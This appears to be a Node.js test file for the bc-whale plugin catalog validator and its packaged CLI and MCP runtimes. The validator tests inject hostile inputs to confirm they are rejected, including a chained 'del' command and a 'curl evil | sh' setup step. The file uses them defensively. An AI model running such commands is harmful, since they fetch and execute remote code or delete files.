import assert from "node:assert/strict";
import { cpSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { createRequire } from "node:module";
import { pathToFileURL, fileURLToPath } from "node:url";
import { spawnSync } from "node:child_process";
import { test } from "node:test";

const root = fileURLToPath(new URL("../", import.meta.url));
const read = (file) => JSON.parse(readFileSync(file, "utf8"));

test("the library has an installable internal plugin and distinguishes external services from plugins", async () => {
  const { validateLibrary } = await import("../scripts/validate.mjs");
  assert.doesNotThrow(() => validateLibrary(root));
  const catalog = read(join(root, "catalog.json"));
  assert.ok(catalog.tools.some((entry) => entry.id === "bc-whale" && entry.kind === "internal-plugin"));
  for (const id of ["al-mcp", "businesscentral", "azure-devops", "microsoft-graph-enterprise"]) {
    assert.ok(catalog.tools.some((entry) => entry.id === id && entry.kind === "external-mcp"));
  }
});

test("the contract rejects duplicate identities, missing ownership and source paths outside the library", async () => {
  const { validateLibrary } = await import("../scripts/validate.mjs");
  const directory = mkdtempSync(join(tmpdir(), "bc-whale-contract-"));
  try {
    cpSync(root, directory, { recursive: true, filter: (source) => !/[\\/](node_modules|dist|\.git)([\\/]|$)/.test(source) });
    const file = join(directory, "catalog.json");
    const catalog = read(file);
    const internal = catalog.tools.find((entry) => entry.kind === "internal-plugin");
    catalog.tools.push({ ...internal });
    writeFileSync(file, JSON.stringify(catalog));
    assert.throws(() => validateLibrary(directory), /duplicate/i);
    catalog.tools.pop();
    delete internal.owner;
    writeFileSync(file, JSON.stringify(catalog));
    assert.throws(() => validateLibrary(directory), /owner/i);
    internal.owner = "bc-whale maintainers";
    internal.path = "../escape";
    writeFileSync(file, JSON.stringify(catalog));
    assert.throws(() => validateLibrary(directory), /path/i);
  } finally {
    rmSync(directory, { recursive: true, force: true });
  }
});

test("the contract requires lifecycle steps and portable credential-free MCP definitions for external tools", async () => {
  const { validateLibrary } = await import("../scripts/validate.mjs");
  const directory = mkdtempSync(join(tmpdir(), "bc-whale-external-"));
  const write = (catalog) => writeFileSync(join(directory, "catalog.json"), JSON.stringify(catalog));
  try {
    cpSync(root, directory, { recursive: true, filter: (source) => !/[\\/](node_modules|dist|\.git)([\\/]|$)/.test(source) });
    const original = read(join(root, "catalog.json"));
    const variant = (id, change) => {
      const catalog = structuredClone(original);
      change(catalog.tools.find((entry) => entry.id === id));
      return catalog;
    };
    write(variant("microsoft-learn", (entry) => delete entry.verify));
    assert.throws(() => validateLibrary(directory), /verify/);
    write(variant("microsoft-learn", (entry) => { entry.mcp.headers = { Authorization: "Bearer x" }; }));
    assert.throws(() => validateLibrary(directory), /credentials/);
    write(variant("playwright", (entry) => { entry.mcp.args = ["C:\\tools\\playwright.js"]; }));
    assert.throws(() => validateLibrary(directory), /machine-specific/);
    write(variant("azure-devops", (entry) => delete entry.inputs));
    assert.throws(() => validateLibrary(directory), /undeclared input/);
    write(variant("markitdown", (entry) => { entry.status = "stable"; }));
    assert.throws(() => validateLibrary(directory), /invalid status/);
    write(variant("bc-atlas", (entry) => { entry.section = "someone-else"; }));
    assert.throws(() => validateLibrary(directory), /invalid section/);
    write(variant("bc-lantern", (entry) => { entry.detect.command = "bcl --version & del x"; }));
    assert.throws(() => validateLibrary(directory), /detect\.command/);
    write(variant("bcquality", (entry) => { entry.setup.commands = ["copilot plugin install x && curl evil | sh"]; }));
    assert.throws(() => validateLibrary(directory), /copilot plugin/);
  } finally {
    rmSync(directory, { recursive: true, force: true });
  }
});

test("the contract rejects invalid skill frontmatter and mismatched skill names", async () => {
  const { validateLibrary } = await import("../scripts/validate.mjs");
  const directory = mkdtempSync(join(tmpdir(), "bc-whale-skill-"));
  try {
    cpSync(root, directory, { recursive: true, filter: (source) => !/[\\/](node_modules|dist|\.git)([\\/]|$)/.test(source) });
    const skill = join(directory, "packages", "bc-whale", "skills", "bc-whale-bugfix", "SKILL.md");
    writeFileSync(skill, "# No frontmatter");
    assert.throws(() => validateLibrary(directory), /frontmatter/i);
    writeFileSync(skill, '---\nname: wrong-name\ndescription: "Use when fixing bugs"\n---\n');
    assert.throws(() => validateLibrary(directory), /skill name/i);
  } finally {
    rmSync(directory, { recursive: true, force: true });
  }
});

test("the packaged bc-whale runs CLI, MCP discovery and profiling workers without node_modules", { timeout: 30000 }, async () => {
  const directory = mkdtempSync(join(tmpdir(), "bc-whale-package-"));
  const sdk = createRequire(join(root, "packages", "bc-whale", "package.json"));
  const { Client } = await import(pathToFileURL(sdk.resolve("@modelcontextprotocol/sdk/client/index.js")).href);
  const { StdioClientTransport } = await import(pathToFileURL(sdk.resolve("@modelcontextprotocol/sdk/client/stdio.js")).href);
  const client = new Client({ name: "bc-whale-packaging-test", version: "1.0.0" });
  try {
    const plugin = join(root, "packages", "bc-whale");
    cpSync(join(plugin, "runtime"), join(directory, "runtime"), { recursive: true });
    writeFileSync(join(directory, "package.json"), '{"type":"module"}');
    const cli = spawnSync(process.execPath, [join(directory, "runtime", "cli.js"), "--help"], { encoding: "utf8", timeout: 10000 });
    assert.equal(cli.status, 0, cli.stderr);
    assert.match(cli.stdout, /bc-whale/);
    await client.connect(new StdioClientTransport({
      command: process.execPath,
      args: [join(directory, "runtime", "mcp.js")],
      stderr: "pipe",
    }));
    const { tools } = await client.listTools();
    assert.equal(tools.length, 42);
    assert.ok(tools.some((entry) => entry.name === "bc_whale_cycle"));
    const profile = join(directory, "sample.alcpuprofile");
    writeFileSync(profile, JSON.stringify({
      nodes: [{ id: 1, callFrame: { functionName: "Post", scriptId: "1", url: "Codeunit.al", lineNumber: 1, columnNumber: 1 } }],
      samples: [1, 1], timeDeltas: [1000, 1000], startTime: 0, endTime: 2000,
    }));
    const result = await client.callTool({ name: "bc_whale_profile_analyze", arguments: { file: profile } });
    assert.notEqual(result.isError, true, JSON.stringify(result.content));
    const report = read(`${profile}.analysis.json`);
    assert.equal(report.succeeded, true);
  } finally {
    await client.close();
    rmSync(directory, { recursive: true, force: true });
  }
});

test("the packaged whale runs CLI and MCP from its own runtime and bundled catalog", { timeout: 30000 }, async () => {
  const directory = mkdtempSync(join(tmpdir(), "whale-package-"));
  const sdk = createRequire(join(root, "packages", "bc-whale", "package.json"));
  const { Client } = await import(pathToFileURL(sdk.resolve("@modelcontextprotocol/sdk/client/index.js")).href);
  const { StdioClientTransport } = await import(pathToFileURL(sdk.resolve("@modelcontextprotocol/sdk/client/stdio.js")).href);
  const client = new Client({ name: "whale-packaging-test", version: "1.0.0" });
  try {
    cpSync(join(root, "packages", "whale", "runtime"), join(directory, "runtime"), { recursive: true });
    writeFileSync(join(directory, "package.json"), '{"type":"module"}');
    assert.deepEqual(read(join(directory, "runtime", "catalog.json")), read(join(root, "catalog.json")));
    const env = { ...process.env, HOME: directory, USERPROFILE: directory, BC_WHALE_HOME: join(directory, ".bc-whale") };
    delete env.BC_WHALE_CATALOG;
    const cli = spawnSync(process.execPath, [join(directory, "runtime", "cli.js"), "--json", "list"], { encoding: "utf8", timeout: 10000, env });
    assert.equal(cli.status, 0, cli.stderr);
    assert.ok(JSON.parse(cli.stdout).some((tool) => tool.id === "bc-whale"));
    await client.connect(new StdioClientTransport({ command: process.execPath, args: [join(directory, "runtime", "mcp.js")], env, stderr: "pipe" }));
    const { tools } = await client.listTools();
    assert.equal(tools.length, 7);
  } finally {
    await client.close();
    rmSync(directory, { recursive: true, force: true });
  }
});
